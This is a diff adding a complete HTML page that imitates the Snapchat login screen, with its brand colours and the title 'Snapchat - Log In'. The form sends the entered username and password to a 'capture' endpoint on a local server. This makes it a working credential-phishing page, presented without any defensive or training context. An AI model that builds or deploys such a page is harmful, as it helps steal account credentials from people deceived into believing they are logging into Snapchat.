@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat - Log In</title>
+    <style>
+        /* Snapchat Brand Color Palette */
+        :root {
+            --snap-yellow: #FFFC00;
+            --snap-black: #000000;
+            --snap-dark-gray: #121212;
+            --snap-text: #FFFFFF;
+            --snap-gray: #8e8e8e;
+            --snap-border: #333333;
+        }
+
+        body {
+            background-color: var(--snap-black);
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            color: var(--snap-text);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-card {
+            background-color: var(--snap-dark-gray);
+            width: 100%;
+            max-width: 380px;
+            padding: 40px 30px;
+            border-radius: 24px; /* Smoother, modern rounded corners */
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border: 1px solid var(--snap-border);
+        }
+
+        /* Logo Styling */
+        .logo-container {
+            margin-bottom: 25px;
+        }
+
+        .snap-logo {
+            width: 90px;
+            height: 90px;
+            border-radius: 50%; /* Makes the image circular */
+            object-fit: cover; /* Ensures the image fills the circle without stretching */
+            border: 3px solid var(--snap-yellow);
+            box-shadow: 0 0 15px var(--snap-yellow);
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        p.subtitle {
+            color: var(--snap-gray);
+            font-size: 15px;
+            margin-bottom: 35px;
+        }
+
+        /* Form Styling */
+        .form-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            color: var(--snap-gray);
+            margin-bottom: 8px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            background-color: #1e1e1e;
+            border: 1px solid var(--snap-border);
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.3s ease;
+        }
+
+        input:focus {
+            border-color: var(--snap-yellow);
+        }
+
+        /* Button Styling */
+        .btn-login {
+            width: 100%;
+            padding: 16px;
+            background-color: var(--snap-yellow);
+            color: var(--snap-black);
+            border: none;
+            border-radius: 30px; /* Pill shape */
+            font-size: 18px;
+            font-weight: 700;
+            margin-top: 25px;
+            cursor: pointer;
+            transition: transform 0.2s ease, background-color 0.2s ease;
+        }
+
+        .btn-login:hover {
+            background-color: #e6e200;
+        }
+
+        .btn-login:active {
+            transform: scale(0.96);
+        }
+
+        /* Footer Links */
+        .footer-links {
+            margin-top: 35px;
+        }
+
+        .link {
+            color: var(--snap-yellow);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .link:hover {
+            text-decoration: underline;
+        }
+
+        /* Mobile optimization */
+        @media (max-width: 480px) {
+            .login-card {
+                padding: 30px 20px;
+                border: none;
+                box-shadow: none;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-card">
+        <div class="logo-container">
+            <!-- Using a direct image link for the ghost profile -->
+            <img src="snapchat-logo.png" alt="Snapchat" class="snap-logo">
+        </div>
+
+        <h1>Log In Snapchat</h1>
+        <p class="subtitle">Enter your details to continue</p>
+
+        <!-- IMPORTANT: This points to your local server -->
+        <form action="http://localhost:3000/capture" method="POST">
+            <div class="form-group">
+                <label>Username or email</label>
+                <input type="text" name="username" placeholder="Username" required>
+            </div>
+
+            <div class="form-group">
+                <label>Password</label>
+                <input types="password" name="password" placeholder="Password" required>
+            </div>
+
+            <button type="submit" class="btn-login">Log In</button>
+        </form>
+
+        <div class="footer-links">
+            <a href="#" class="link">Forgot Password?</a>
+            <div style="margin-top: 20px;">
+                <a href="#" class="link">Don't have an account? Sign Up</a>
+            </div>
+        </div>
+    </div>
+
+</body>
+</html>
